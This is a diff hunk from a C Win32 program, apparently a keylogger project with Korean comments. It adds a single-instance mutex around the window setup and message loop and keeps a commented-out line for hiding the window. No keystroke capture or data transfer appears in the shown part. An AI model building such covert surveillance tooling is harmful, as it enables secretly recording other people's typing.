@@ -339,31 +339,38 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance
 	MSG Message;
 	WNDCLASS WndClass;
 	g_hInst = hInstance;
-
 	HWND hWndMain;
 	LPCTSTR lpszClass = TEXT("Keylogger");
 
-	WndClass.cbClsExtra = 0;
-	WndClass.cbWndExtra = 0;
-	WndClass.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
-	WndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
-	WndClass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
-	WndClass.hInstance = hInstance;
-	WndClass.lpfnWndProc = WndProc;
-	WndClass.lpszClassName = lpszClass;
-	WndClass.lpszMenuName = NULL;
-	WndClass.style = CS_HREDRAW | CS_VREDRAW;
-	RegisterClass(&WndClass);
-
-	hWnd = CreateWindow(lpszClass, lpszClass, WS_OVERLAPPEDWINDOW,
-		CW_USEDEFAULT, CW_USEDEFAULT, 500, 100,
-		NULL, (HMENU)NULL, hInstance, NULL);
-	//ShowWindow(hWnd, SW_HIDE);  // SW_HIDE : 윈도우 숨기기, nCmdShow : 윈도우 보이기
-	//hWndMain = hWnd;
-
-	while (GetMessage(&Message, NULL, 0, 0)) {   //http://soen.kr/lecture/win32api/lec4/lec4-1-4.htm : GetMessage로 메시지큐에서 메시지를 꺼내온 후 이 메시지를 TranslatteMessage함수로 넘겨준 후 이 문자가 문자키인지 검사한 후 WM_CHAR 메시지를 만들어서 메시지큐에 덧붙인다.
-		TranslateMessage(&Message);
-		DispatchMessage(&Message);
+	HANDLE hMutex = CreateMutexA(NULL, TRUE, "My Keylogger");              // 중복 프로세스 실행 방지를 위한 mutex 사용
+	DWORD error = GetLastError();
+	if (error == ERROR_ALREADY_EXISTS)
+	{
+		return 0;
 	}
-	return (int)Message.wParam;
+	else if (error == ERROR_SUCCESS) {
+		WndClass.cbClsExtra = 0;
+		WndClass.cbWndExtra = 0;
+		WndClass.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
+		WndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
+		WndClass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
+		WndClass.hInstance = hInstance;
+		WndClass.lpfnWndProc = WndProc;
+		WndClass.lpszClassName = lpszClass;
+		WndClass.lpszMenuName = NULL;
+		WndClass.style = CS_HREDRAW | CS_VREDRAW;
+		RegisterClass(&WndClass);
+
+		hWnd = CreateWindow(lpszClass, lpszClass, WS_OVERLAPPEDWINDOW,
+			CW_USEDEFAULT, CW_USEDEFAULT, 500, 100,
+			NULL, (HMENU)NULL, hInstance, NULL);
+		//ShowWindow(hWnd, SW_HIDE);  // SW_HIDE : 윈도우 숨기기, nCmdShow : 윈도우 보이기
+		//hWndMain = hWnd;
+
+		while (GetMessage(&Message, NULL, 0, 0)) {   //http://soen.kr/lecture/win32api/lec4/lec4-1-4.htm : GetMessage로 메시지큐에서 메시지를 꺼내온 후 이 메시지를 TranslatteMessage함수로 넘겨준 후 이 문자가 문자키인지 검사한 후 WM_CHAR 메시지를 만들어서 메시지큐에 덧붙인다.
+			TranslateMessage(&Message);
+			DispatchMessage(&Message);
+		}
+		return (int)Message.wParam;
+	}
 }
